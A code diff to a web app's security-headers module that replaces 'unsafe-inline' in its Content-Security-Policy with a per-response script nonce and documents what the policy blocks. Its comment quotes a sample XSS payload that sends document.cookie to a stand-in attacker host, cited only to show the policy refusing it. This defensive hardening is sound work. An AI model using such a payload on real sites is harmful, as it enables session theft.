@@ -16,27 +16,36 @@ import { currentInstallation } from "../installation/policy";
  * Stated precisely, because a Content-Security-Policy that is described as
  * stronger than it is becomes a reason not to look at the real defences.
  *
- * TanStack Start streams an inline `<script>` carrying the route manifest, and
- * its contents differ per request — so it cannot be allowed by hash, and
- * allowing it needs `'unsafe-inline'`. That keyword also permits inline event
- * handlers, so **this policy would not have stopped the `onerror` in that XSS
- * from running**.
+ * `script-src` allows this origin's files and inline scripts carrying the
+ * response's nonce — nothing else. `src/server.ts` makes a fresh random nonce
+ * per response and hands it to TanStack Start as request context;
+ * `src/router.tsx` sets it as the router's `ssr.nonce`, which Start puts on
+ * every inline script it emits (the dehydrated router state and its bootstrap,
+ * React's streaming scripts, scroll restoration, and the `csp-nonce` meta
+ * tag the browser-side router reads back for scripts it adds later). The one
+ * inline script of our own — the appearance boot script in `__root.tsx` —
+ * takes the same nonce from the router.
  *
- * What it does stop is the half that makes such a bug worth exploiting:
+ * Because there is no `'unsafe-inline'`, injected markup cannot run: an
+ * `onerror=` or `onclick=` attribute is refused, and so is a `<script>`
+ * without the nonce, which stored content cannot know in advance. (That is why
+ * the static error page has no `onclick`.) Styles still need
+ * `'unsafe-inline'`: React renders `style` attributes, which a nonce cannot
+ * cover. Inline style cannot run script.
+ *
+ * The rest limits what a successful injection could do anyway:
  *
  * - `connect-src 'self'` — the payload's `fetch('https://evil.test/?c=' +
  *   document.cookie)` is refused. Script that cannot talk to an attacker's
  *   server cannot exfiltrate what it reads.
- * - `script-src 'self'` — no loading a larger payload from another origin.
  * - `object-src 'none'`, `frame-src 'none'` — no plugin or frame smuggling.
  * - `base-uri 'self'` — no rewriting where relative URLs resolve.
  * - `form-action 'self'` — no posting a form somewhere else.
  * - `frame-ancestors 'none'` — Oikonomia cannot be framed, so it cannot be
  *   clickjacked.
  *
- * Moving to a nonce would remove the `'unsafe-inline'` caveat, and needs the
- * nonce threaded into the streamed script tag. It is recorded as follow-up
- * work rather than claimed here.
+ * A response built without a nonce (only tests do) gets `script-src 'self'`:
+ * stricter, never looser.
  *
  * ## Why not in development
  *
@@ -55,13 +64,15 @@ const POLICY: Record<string, string> = {
   "img-src": "'self' data: blob:",
   "font-src": "'self' https://fonts.gstatic.com",
   "style-src": "'self' 'unsafe-inline' https://fonts.googleapis.com",
-  "script-src": "'self' 'unsafe-inline'",
+  "script-src": "'self'",
   "connect-src": "'self'",
   "worker-src": "'self' blob:",
 };
 
-export function contentSecurityPolicy(https: boolean): string {
-  const directives = Object.entries(POLICY).map(([name, value]) => `${name} ${value}`);
+export function contentSecurityPolicy(https: boolean, nonce?: string): string {
+  const directives = Object.entries(POLICY).map(([name, value]) =>
+    name === "script-src" && nonce ? `${name} ${value} 'nonce-${nonce}'` : `${name} ${value}`,
+  );
 
   /* Only over HTTPS. On plain http it would upgrade every request to a scheme
      the server is not listening on, which is a broken site rather than a
@@ -80,6 +91,8 @@ export function contentSecurityPolicy(https: boolean): string {
 export function securityHeaders(options: {
   https: boolean;
   development: boolean;
+  /** This response's script nonce (`src/server.ts`). */
+  nonce?: string;
   /** A public demonstration, whose invented records must not be indexed as a real church's. */
   noindex?: boolean;
 }): Record<string, string> {
@@ -95,7 +108,7 @@ export function securityHeaders(options: {
   };
 
   if (!options.development) {
-    headers["Content-Security-Policy"] = contentSecurityPolicy(options.https);
+    headers["Content-Security-Policy"] = contentSecurityPolicy(options.https, options.nonce);
   }
 
   if (options.https) {
@@ -136,11 +149,12 @@ function noindex(): boolean {
  * A header the application set deliberately wins — `Set-Cookie` above all,
  * which must never be replaced by a blanket pass.
  */
-export function withSecurityHeaders(response: Response): Response {
+export function withSecurityHeaders(response: Response, nonce?: string): Response {
   const headers = securityHeaders({
     https: deploymentIsHttps(),
     development: process.env["NODE_ENV"] !== "production",
     noindex: noindex(),
+    ...(nonce ? { nonce } : {}),
   });
 
   for (const [name, value] of Object.entries(headers)) {
